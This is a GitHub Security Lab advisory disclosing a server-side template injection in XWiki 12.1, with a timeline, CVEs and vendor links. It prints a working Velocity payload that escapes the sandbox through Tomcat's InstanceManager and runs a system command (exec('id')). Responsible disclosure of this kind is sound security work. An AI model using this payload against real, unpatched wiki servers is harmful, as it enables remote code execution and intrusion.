<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">August 19, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-046: Server-Side Template Injection in XWiki</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>A user with privileges to edit wiki content may execute arbitrary Java code or run arbitrary system commands with the same privileges as the account running XWiki.</p>

<h2 id="product">Product</h2>

<p>XWiki</p>

<h2 id="tested-version">Tested Version</h2>

<p>XWiki 12.1</p>

<h2 id="details">Details</h2>

<h3 id="server-side-template-injection-velocity">Server-Side Template Injection (Velocity)</h3>

<p>Even though XWiki does a good job installing the Velocity SecureUberspector to sandbox the User macro templates, it stills exposes a number of objects through the Templating API that can be used to circumvent the sandbox and achieve remote code execution.</p>

<p>Deep inspection of the exposed objects’ object graph allows an attacker to get access to objects that allow them to instantiate arbitrary Java objects. In particular, it exposes the Servlet Context through <code class="language-plaintext highlighter-rouge">$request.getServletContext()</code></p>

<p>We can then list all Servlet Context attributes with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ul&gt;
  #foreach( $attr in $request.getServletContext().getAttributeNames() )
    &lt;li&gt;$attr&lt;/li&gt;
  #end
&lt;/ul&gt;
</code></pre></div></div>

<p>On a Tomcat server (used in official XWiki Docker image), we get:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">javax.servlet.context.tempdir</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.catalina.resources</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.struts.action.REQUEST_PROCESSOR</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.tomcat.InstanceManager</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.catalina.jsp_classpath</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.struts.action.MODULE</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.struts.action.PLUG_INS</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.restlet.ext.servlet.ServerServlet.component.RestletServlet</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.tomcat.JarScanner</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.xwiki.component.manager.ComponentManager</code></li>
  <li><code class="language-plaintext highlighter-rouge">javax.servlet.context.orderedLibs</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.struts.globals.MODULE_PREFIXES</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.struts.action.SERVLET_MAPPING</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.restlet.ext.servlet.ServerServlet.application.RestletServlet</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.apache.struts.action.ACTION_SERVLET</code></li>
  <li><code class="language-plaintext highlighter-rouge">xwiki</code></li>
  <li><code class="language-plaintext highlighter-rouge">org.restlet.ext.servlet.ServerServlet.server.RestletServlet</code></li>
</ul>

<p>The most interesting one is <code class="language-plaintext highlighter-rouge">org.apache.tomcat.InstanceManager</code> which enables us to instantiate arbitrary objects. Note that this class is available on e.g. Jetty as well and similar classes are available on other servers. For example JBoss/WildFly exposes <code class="language-plaintext highlighter-rouge">org.wildfly.extension.undertow.deployment.UndertowJSPInstanceManage</code>.</p>

<p>An attacker can access an Instance manager with any of the options below (probably more):</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">${request.servletContext.getAttribute('org.apache.tomcat.InstanceManager')}</code></li>
  <li><code class="language-plaintext highlighter-rouge">${request.servletContext.getAttribute('org.apache.catalina.resources').getContext().getInstanceManager()}</code></li>
</ul>

<p>Once an attacker gets access to an Instance Manager, they can use it to instantiate arbitrary Java objects and invoke methods that may lead to arbitrary code execution, effectively bypassing the sandbox. Probably the most common one is to instantiate a <code class="language-plaintext highlighter-rouge">ScriptEngineManager</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p&gt;$request.getServletContext().getAttribute("org.apache.tomcat.InstanceManager").newInstance("javax.script.ScriptEngineManager").getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')")&lt;/p&gt;
</code></pre></div></div>

<h3 id="impact">Impact</h3>

<p>This issue may lead to <code class="language-plaintext highlighter-rouge">Remote Code Execution</code>.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>03/23/2020: Sent email to contact@xwiki.com asking for security contact</li>
  <li>03/23/2020: Created Jira Issue at https://jira.xwiki.org/browse/XWIKI-17141</li>
  <li>04/02/2020: XWiki acknowledged the issue</li>
  <li>04/30/2020: XWiki found a similar vector of attack and fixed it in XWIKI-17266.</li>
  <li>05/15/2020: XWiki releases fixes as part of XWiki 12.2.1 and XWiki 11.10.5. releases.</li>
  <li>06/10/2020: New RCE vectors are reported to XWiki.</li>
  <li>07/10/2020: XWiki releases fixes as part of XWiki 12.5 and XWiki 11.10.6 releases.</li>
</ul>

<h2 id="vendor-advisories">Vendor Advisories:</h2>
<ul>
  <li>https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-7qw5-pqhc-xm4g</li>
  <li>https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-5hv6-mh8q-q9v8</li>
</ul>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2020-15171</li>
  <li>CVE-2020-15252</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Munoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include the <code class="language-plaintext highlighter-rouge">GHSL-2020-046</code> in any communication regarding this issue.</p>

  